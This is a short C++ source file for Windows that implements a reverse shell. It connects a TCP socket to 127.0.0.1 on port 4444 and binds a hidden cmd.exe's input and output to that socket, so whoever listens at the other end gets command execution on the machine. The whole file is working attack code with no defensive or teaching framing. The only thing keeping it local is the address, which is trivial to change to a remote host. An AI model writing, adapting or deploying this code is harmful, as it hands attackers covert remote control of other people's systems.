#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
int port = 4444;
const char* addr = "127.0.0.1";

void listenandall() {
	WSADATA wsaData;
	int result = WSAStartup(2.2, &wsaData);


	SOCKET mysock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	if (mysock == INVALID_SOCKET) {
		std::cout << "couldnt create socket" << std::endl;
		return;
	}
	sockaddr_in mystruct;
	mystruct.sin_family = AF_INET;
	mystruct.sin_port = htons(port);
	inet_pton(AF_INET, addr, &mystruct.sin_addr);
	
	int wspi = connect(mysock, (sockaddr*)&mystruct, sizeof(mystruct));
	
	// 3
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;


	HANDLE hSock = (HANDLE)mysock;
	si.hStdError = hSock;
	si.hStdOutput = hSock;
	si.hStdInput = hSock;
	std::cout << "starting cmd.." << std::endl;
	bool success = CreateProcessA(
		"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, true, NULL, 0, NULL, &si, &pi
	);

	if (success) {
		WaitForSingleObject(pi.hProcess, INFINITE);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	std::cout << "cmd closed, cleaning up" << std::endl;
	closesocket(mysock);
	WSACleanup();
	
	
}

int main()
{
	std::cout << "starting reverse shell on port " << port << std::endl;
	listenandall();

}
